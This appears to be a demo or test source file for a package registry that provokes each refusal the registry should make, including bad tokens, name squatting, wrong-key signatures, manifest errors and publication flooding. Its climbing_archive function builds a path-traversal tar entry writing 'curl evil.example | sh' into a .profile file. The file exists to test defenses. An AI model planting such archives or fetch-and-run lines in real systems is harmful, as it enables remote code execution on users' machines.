# Every refusal a registry owes, provoked once by the demo's session: a
# publication with no token and with a mistyped one, a name squatting on
# another publisher's, a package of another publisher, a version replaced, a
# signature by the wrong key or for another version, an archive climbing out
# of its folder, a manifest the schema refuses or naming another version, a
# dependency the registry does not hold, and a publisher flooding the
# registry past its limit of publications.

use <rebel>/archive as tar
use <rebel>/bytes

use client/client
use demo/sources
use demo/steps
use packages/pack
use signing/signers

## Refusals

# Every refusal the registry owes, provoked once.
#
# - `out`: the transcript.
# - `ana`: ana's client.
# - `bruno`: bruno's client.
# - `reader`: a client with no token.
# - `base`: the registry's URL.
# - `ana_token`: ana's token, of which a mistyped copy is sent.
# - `work`: the folder the session works in.
# - `ana_key`: ana's key id.
# - `bruno_key`: bruno's key id.
#
# Fails where building an attempt fails.
function provoke(@out: [str], @ana: client.Client, @bruno: client.Client, @reader: client.Client, base: str, ana_token: str, work: str, ana_key: str, bruno_key: str) -> ()?
    tk = steps.packed(work: work, name: "textkit", version: "1.3.0", files: sources.textkit("1.3.0"), packing: .zstd)?
    good_signature = steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.3.0", archive: tk)?
    steps.attempt(
        @out,
        c: @reader,
        what: "a publication with no token",
        name: "textkit",
        version: "1.3.0",
        archive: tk,
        signature: good_signature
    )
    last = ana_token.slice(from: ana_token.len() - 1, to: ana_token.len())

    other = if last == "0"
        "1"
    else
        "0"
    mistyped @= client.new_client(base: base, token: ana_token.slice(from: 0, to: ana_token.len() - 1) + other)?
    steps.attempt(
        @out,
        c: @mistyped,
        what: "a token with its last digit mistyped",
        name: "textkit",
        version: "1.3.0",
        archive: tk,
        signature: good_signature
    )
    squat = steps.packed(work: work, name: "textklt", version: "1.0.0", files: sources.textklt(), packing: .zstd)?
    steps.attempt(
        @out,
        c: @bruno,
        what: "bruno publishes textklt",
        name: "textklt",
        version: "1.0.0",
        archive: squat,
        signature: steps.signed(who: "bruno", key_id: bruno_key, name: "textklt", version: "1.0.0", archive: squat)?
    )
    theirs = steps.packed(work: work, name: "textkit", version: "9.0.0", files: sources.textkit("9.0.0"), packing: .zstd)?
    steps.attempt(
        @out,
        c: @bruno,
        what: "bruno publishes textkit 9.0.0",
        name: "textkit",
        version: "9.0.0",
        archive: theirs,
        signature: steps.signed(who: "bruno", key_id: bruno_key, name: "textkit", version: "9.0.0", archive: theirs)?
    )
    regzipped = steps.packed(work: work, name: "textkit", version: "1.0.0", files: sources.textkit("1.0.0"), packing: .gzip)?
    steps.attempt(
        @out,
        c: @ana,
        what: "textkit 1.0.0 again, packed as .tar.gz",
        name: "textkit",
        version: "1.0.0",
        archive: regzipped,
        signature: steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.0.0", archive: regzipped)?
    )
    steps.attempt(
        @out,
        c: @ana,
        what: "textkit 1.3.0 signed by mallory's key, naming ana's",
        name: "textkit",
        version: "1.3.0",
        archive: tk,
        signature: steps.signed(who: "mallory", key_id: ana_key, name: "textkit", version: "1.3.0", archive: tk)?
    )
    mallory_id = signers.id_of(signers.read_public(steps.public_pem_of("mallory")?)?)
    steps.attempt(
        @out,
        c: @ana,
        what: "textkit 1.3.0 signed by mallory's own key",
        name: "textkit",
        version: "1.3.0",
        archive: tk,
        signature: steps.signed(who: "mallory", key_id: mallory_id, name: "textkit", version: "1.3.0", archive: tk)?
    )
    steps.attempt(
        @out,
        c: @ana,
        what: "textkit 1.3.0 signed for 1.3.1",
        name: "textkit",
        version: "1.3.0",
        archive: tk,
        signature: steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.3.1", archive: tk)?
    )
    climbing = climbing_archive()?
    steps.attempt(
        @out,
        c: @ana,
        what: "an archive with an entry climbing out",
        name: "textkit",
        version: "1.3.0",
        archive: climbing,
        signature: steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.3.0", archive: climbing)?
    )
    many_words = with_manifest(
        sources.textkit("1.3.0"),
        text: "[package]\nname = \"textkit\"\nversion = \"1.3.0\"\ndescription = \"Text helpers.\"\nlicense = \"Apache-2.0\"\nkeywords = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\"]\n"
    )
    six = steps.packed(work: work, name: "textkit", version: "1.3.0", files: many_words, packing: .zstd)?
    steps.attempt(
        @out,
        c: @ana,
        what: "a manifest with six keywords",
        name: "textkit",
        version: "1.3.0",
        archive: six,
        signature: steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.3.0", archive: six)?
    )
    other_version = with_manifest(
        sources.textkit("1.3.0"),
        text: "[package]\nname = \"textkit\"\nversion = \"1.3.1\"\ndescription = \"Text helpers.\"\nlicense = \"Apache-2.0\"\n"
    )
    mismatch = steps.packed(work: work, name: "textkit", version: "1.3.0", files: other_version, packing: .zstd)?
    steps.attempt(
        @out,
        c: @ana,
        what: "a manifest of 1.3.1 in the folder of 1.3.0",
        name: "textkit",
        version: "1.3.0",
        archive: mismatch,
        signature: steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.3.0", archive: mismatch)?
    )
    unknown_dependency = with_manifest(
        sources.textkit("1.3.0"),
        text: "[package]\nname = \"textkit\"\nversion = \"1.3.0\"\ndescription = \"Text helpers.\"\nlicense = \"Apache-2.0\"\n\n[dependencies.unicode_extra]\nversion = \"^0.4\"\n"
    )
    missing = steps.packed(work: work, name: "textkit", version: "1.3.0", files: unknown_dependency, packing: .zstd)?
    steps.attempt(
        @out,
        c: @ana,
        what: "a dependency no package of the registry is",
        name: "textkit",
        version: "1.3.0",
        archive: missing,
        signature: steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.3.0", archive: missing)?
    )
    flood(@out, ana: @ana, work: work, ana_key: ana_key)?
    return ok()

# A tar whose second entry climbs out of the package's folder, as a forger
# writes one, compressed as Zstandard.
#
# Fails as `tar.encode_tar` and `pack.packed` fail.
function climbing_archive() -> [u8]?
    manifest_entry @= tar.tar_entry("textkit-1.3.0/heroes.toml", kind: .file)
    manifest_data = bytes.from_text(
        "[package]\nname = \"textkit\"\nversion = \"1.3.0\"\ndescription = \"T.\"\nlicense = \"MIT\"\n"
    )
    manifest_entry.size @ manifest_data.len()
    evil_entry @= tar.tar_entry("textkit-1.3.0/../../.profile", kind: .file)
    evil_data = bytes.from_text("curl evil.example | sh\n")
    evil_entry.size @ evil_data.len()
    return pack.packed(
        [tar.TarMember(entry: manifest_entry, data: manifest_data), tar.TarMember(entry: evil_entry, data: evil_data)],
        packing: .zstd
    )

# `files` with the manifest's text replaced by `text`.
#
# - `files`: a package's files.
# - `text`: the manifest's new text.
function with_manifest(files: [sources.Source], text: str) -> [sources.Source]
    changed: [sources.Source] @= []

    for f in files
        if f.name == "heroes.toml"
            changed @ changed.push(sources.Source(name: f.name, text: text))
        else
            changed @ changed.push(f)

    return changed

# Ana publishes the same bytes of textkit 1.0.0 again and again, as a script
# gone wrong would, until the registry's limit of publications refuses her.
#
# - `out`: the transcript.
# - `ana`: ana's client.
# - `work`: the folder the session works in.
# - `ana_key`: ana's key id.
#
# Fails where packing or signing fails.
function flood(@out: [str], @ana: client.Client, work: str, ana_key: str) -> ()?
    tk = steps.packed(work: work, name: "textkit", version: "1.0.0", files: sources.textkit("1.0.0"), packing: .zstd)?
    signature = steps.signed(who: "ana", key_id: ana_key, name: "textkit", version: "1.0.0", archive: tk)?
    accepted: i64 @= 0

    while accepted < 20
        match client.publish(@ana, name: "textkit", version: "1.0.0", archive: tk, signature: signature)
            .ok _ => accepted @ accepted + 1
            .err e =>
                if e.code == client.LIMIT
                    steps.say(
                        @out,
                        f"ana sends textkit 1.0.0 again and again: {accepted} more accepted, then refused 429, the wait asked longer than this client's patience"
                    )
                    return ok()
                steps.say(@out, f"ana sends textkit 1.0.0 again and again: refused otherwise, {e.msg}")
                return ok()

    steps.say(@out, "ana sends textkit 1.0.0 twenty times more: never limited, which the registry should have done")
    return ok()
